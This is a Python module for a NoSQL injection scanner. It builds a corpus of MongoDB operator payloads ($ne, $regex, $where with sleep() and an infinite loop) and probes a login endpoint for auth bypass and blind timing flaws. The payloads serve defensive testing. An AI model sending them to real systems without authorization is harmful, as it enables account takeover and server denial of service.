"""U-DEEP-13 — NoSQL Injection.

Family: NOSQL_INJECTION. Detection principle: STATE OVER STRING — a
finding requires the server's auth or business state to actually change
(an auth bypass where clean credentials fail, or a blind timing anomaly
on a JavaScript operator), never a mere echo of the payload. The
operator corpus (``$ne`` / ``$gt`` / ``$gte`` / ``$regex`` / ``$where``
/ ``$expr``) is documented in ``NOSQL_INJECTION_ATTACKS``.

Zero live network: the transport is the injected
``send(endpoint, body)`` callable; findings are advisory evidence only
(DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

from dataclasses import dataclass

# Spec corpus, verbatim structure (U-DEEP-13): three groups.
NOSQL_INJECTION_ATTACKS: dict[str, dict] = {
    "auth_bypass": {
        "endpoint": "/login",
        "credentials": {"username": "victim",
                        "password": "definitely-wrong"},
        "operators": ["$ne", "$gt", "$gte", "$regex", "$where", "$expr"],
        "values": {
            "$ne": "",
            "$gt": "",
            "$gte": "",
            "$regex": ".*",
            "$where": "this.username === 'victim'",
            "$expr": True,
        },
    },
    "js_injection": {
        "payloads": [
            {"$where": "sleep(5000) || true"},
            {"$where": "this.password.length > 0"},
            {"$where": "while(true){}"},
        ],
    },
    "blind_timing": {
        "threshold_ms": 1000,
        "payload": {"$where": "sleep(2000) || this.username === 'victim'"},
    },
}

SEVERITY_BY_SUBFAMILY = {
    "auth_bypass": "critical",
    "js_injection": "high",
    "blind_timing": "medium",
}


@dataclass(frozen=True)
class NoSqlInjectionFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    payload: dict
    operator: str
    family: str = "NOSQL_INJECTION"
    confidence: float = 0.9
    statement: str = ""
    success_indicator: str = ""


class NoSqlInjectionDetector:
    """Probes the documented operator corpus against a clean baseline."""

    def __init__(self, send) -> None:
        self._send = send
        auth_bypass = NOSQL_INJECTION_ATTACKS["auth_bypass"]
        self._endpoint = auth_bypass["endpoint"]
        self._credentials = auth_bypass["credentials"]
        self._operators = auth_bypass["operators"]
        self._values = auth_bypass["values"]
        self._blind_threshold_ms = \
            NOSQL_INJECTION_ATTACKS["blind_timing"]["threshold_ms"]

    # ------------------------------------------------------------------

    def scan(self) -> list[NoSqlInjectionFinding]:
        baseline = self._send(self._endpoint, dict(self._credentials))
        baseline_line = (
            f"baseline: status {baseline.status_code}, "
            f"elapsed_ms {baseline.elapsed_ms}, "
            f"body {baseline.json()!r}")
        findings: list[NoSqlInjectionFinding] = []
        for operator in self._operators:
            payload = {
                "username": self._credentials["username"],
                "password": {operator: self._values[operator]},
            }
            probe = self._send(self._endpoint, payload)
            if self._bypassed(baseline, probe):
                findings.append(self._finding(
                    "auth_bypass", payload, operator, baseline_line, probe))
            if (probe.elapsed_ms - baseline.elapsed_ms
                    >= self._blind_threshold_ms):
                findings.append(self._finding(
                    "blind_timing", payload, operator, baseline_line, probe))
        return findings

    # ------------------------------------------------------------------

    @staticmethod
    def _bypassed(baseline, probe) -> bool:
        """STATE OVER STRING: the probe must flip the auth state the
        clean credentials could not — an authenticated response where
        the baseline was rejected."""
        return (probe.status_code == 200
                and baseline.status_code != 200
                and probe.json() != baseline.json())

    def _finding(self, subfamily: str, payload: dict, operator: str,
                 baseline_line: str, probe) -> NoSqlInjectionFinding:
        if subfamily == "auth_bypass":
            statement = (
                f"NoSQL operator {operator} changed the server's auth "
                "state where clean credentials failed — NoSQL injection "
                "(advisory; verify against an authorized target).")
            success_indicator = (
                f"{operator} payload authenticated where the clean "
                "credentials were rejected")
        else:
            statement = (
                f"NoSQL JavaScript payload {operator} produced a timing "
                "anomaly consistent with server-side evaluation — blind "
                "NoSQL injection (advisory; verify against an authorized "
                "target).")
            success_indicator = (
                "response latency above the blind-timing threshold under "
                f"the {operator} payload")
        return NoSqlInjectionFinding(
            subfamily=subfamily,
            severity=SEVERITY_BY_SUBFAMILY[subfamily],
            evidence=(
                baseline_line,
                f"probe: status {probe.status_code}, "
                f"elapsed_ms {probe.elapsed_ms}, "
                f"body {probe.json()!r}",
                f"operator: {operator}",
            ),
            payload=payload,
            operator=operator,
            statement=statement,
            success_indicator=success_indicator,
        )
